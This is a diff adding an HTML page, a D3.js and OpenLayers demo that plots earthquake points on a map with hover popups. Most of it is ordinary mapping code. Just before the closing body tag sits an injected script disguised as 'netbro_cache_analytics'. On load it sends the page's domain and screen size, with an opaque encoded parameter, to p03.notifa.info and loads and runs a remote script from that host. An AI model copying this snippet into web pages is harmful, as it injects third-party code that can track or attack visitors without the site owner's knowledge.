@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <title>D3.js and OpenLayers - Earthquakes (Points)</title>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/openlayers/2.13.1/theme/default/style.css" type="text/css">
+        <link rel="stylesheet" href="olstyle.css" type="text/css">
+        <link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.9.0/themes/blitzer/jquery-ui.css" type="text/css">
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" ></script>
+	<script src="//ajax.googleapis.com/ajax/libs/jqueryui/1.10.2/jquery-ui.min.js"></script>
+	<script src="https://d3js.org/d3.v2.min.js?2.9.3"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/openlayers/2.13.1/OpenLayers.js"></script>
+
+        <script type="text/javascript">
+            var map;
+            var extent = [-20037508.34, -20037508.34,
+                20037508.34, 20037508.34
+            ];
+
+
+            function init() {
+                map = new OpenLayers.Map('map', {
+                    numZoomLevels: 20,
+                    projection: new OpenLayers.Projection("EPSG:900913"),
+                    displayProjection: new OpenLayers.Projection("EPSG: 4326"),
+                    maxExtent: extent,
+                    restrictedExtent: extent,
+                    controls: [
+                        new OpenLayers.Control.Navigation(),
+                        new OpenLayers.Control.PanZoomBar(),
+                        new OpenLayers.Control.ScaleLine(),
+                        new OpenLayers.Control.MousePosition(),
+                        new OpenLayers.Control.KeyboardDefaults()
+                    ]
+                });
+
+
+
+                var ol_wms = new OpenLayers.Layer.WMS(
+                    "OpenLayers WMS",
+                    "http://vmap0.tiles.osgeo.org/wms/vmap0", {
+                    layers: 'basic'
+                });
+
+
+                map.addLayers([ol_wms]);
+
+                map.setCenter(new OpenLayers.LonLat(0, 0), 3);
+
+
+                d3.json("quakes.json", function (collection) {
+                    var overlay = new OpenLayers.Layer.Vector("stations");
+
+                    // Add the container when the overlay is added to the map.
+                    overlay.afterAdd = function () {
+
+                        var div = d3.selectAll("#" + overlay.div.id);
+                        div.selectAll("svg").remove();
+                        var svg = div.append("svg");
+                        g = svg.append("g");
+
+                        var bounds = d3.geo.bounds(collection),
+                            path = d3.geo.path().projection(project);
+
+                        var feature = g.selectAll("path")
+                            .data(collection.features)
+                            .enter().append("path")
+                            .attr("d", path.pointRadius(function (d) {
+                            return Math.sqrt((Math.exp(parseFloat(d.properties.mag))));
+                        }))
+                            .on("mouseover", function (d) {
+                            var mousePosition = d3.svg.mouse(this);
+                            var format = d3.time.format("%Y-%m-%d %HH:%MM:%SS");
+                            $("#pop-up").fadeOut(100, function () {
+                                // Popup content
+                                $("#pop-up-title").html(format(new Date(parseInt(d.properties.time))));
+                                $("#pop-img").html(d.properties.mag);
+                                $("#pop-desc").html(d.properties.place);
+
+                                // Popup position
+                                var popLeft = mousePosition[0] + 300 > screen.width ?
+                                    mousePosition[0] - 400 : mousePosition[0];
+                                var popTop = mousePosition[1];
+                                $("#pop-up").css({
+                                    "left": popLeft + 50,
+                                    "top": popTop
+                                });
+                                $("#pop-up").fadeIn(100);
+                            });
+                        }).
+                        on("mouseout", function () {
+                            $("#pop-up").fadeOut(50);
+                        });
+
+                        map.events.register("moveend", map, reset);
+
+                        reset();
+
+  	
+                        function reset() {
+
+                            var bottomLeft = project(bounds[0]),
+                                topRight = project(bounds[1]);
+
+                            svg.attr("width", topRight[0] - bottomLeft[0])
+                                .attr("height", bottomLeft[1] - topRight[1])
+                                .style("margin-left", bottomLeft[0] + "px")
+                                .style("margin-top", topRight[1] + "px");
+
+                            g.attr("transform", "translate(" + -bottomLeft[0] + "," + -topRight[1] + ")");
+
+                            feature.attr("d", path);
+                        }
+
+                        function project(x) {
+                            var point = map.getViewPortPxFromLonLat(new OpenLayers.LonLat(x[0], x[1])
+                                .transform("EPSG:4326", "EPSG:900913"));
+                            return [point.x, point.y];
+                        }
+                    }
+
+                    map.addLayer(overlay);
+
+
+
+                });
+
+            }
+        </script>
+    </head>
+    <body onload="init()">
+
+        <div id="map"></div>
+		
+        <a href="#" id="permalink" onclick="drawSVG();return false;">Permalink</a>
+		<div id="pop-up">
+			<div id="pop-up-title"></div>
+			<div id="pop-up-content">
+				<table> <tr>
+					<td><div id="pop-img"></div></td>
+					<td><div id="pop-desc"></div></td>
+				</tr> </table>
+			</div>
+		</div>
+<div id="slider"></div>
+        <div id="docs"></div>
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAAPWY5UEqTukWd5g55VOA1hoMWL%2fNMKzRQq2gsNVYWHIfS4orgG01G2CRBHGoCJIGzMFO4lcBcMo2kvr3JtI%2bGgAiON%2b38Ml8bgniKww6H5IIj43uf7mrpnGyw11HFS1n%2bptKh7Pmw%2fxrpYH2Iu%2bZ10GiMTTB%2fAQjsBXySTGqf%2bgBvbzmtA0dx5K0jNG9sHqrSK%2fzG4Pn31oyAfHHLbMK9lIvVJpZDPxMfJKaqbrT4wjjifGb6jJaqY3rRnTe9c7FvCUSDi8DX%2bBidBQ%2b%2bm7GP0pyGquhmR%2fztmOCNd1Le9qPA7nPM5QgwUvm1Iq5tczvHOf8hHhhiwakfE69ebCf10FpeD0vn5SX2qSJ6La93iWgFYcoEjtw07HXwU05Q74so1E8UzsMCeDBe8nDo6kVVgfCOm5GeP0q3zzxG4U320bfbRznTcDPHyUclp2s1Vnw8pSj%2fF%2bMqeID8LmlAMnwCA8OlNttE%2frHr7u1rbLEG5g9yOWBlVkPAPad0tRxEAWknITo%2fVyBu0HG8cML7MEKhUdVppYL1fXUQF92qbX64w4TuU6FjuUnI27%2bp14CtZhVqFQZTU35wyj4Pv3kKqq61yd95PHW%2fbyv28ew4KyZw0Ah%2fh7RqdmQdypJLte4YxaF" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
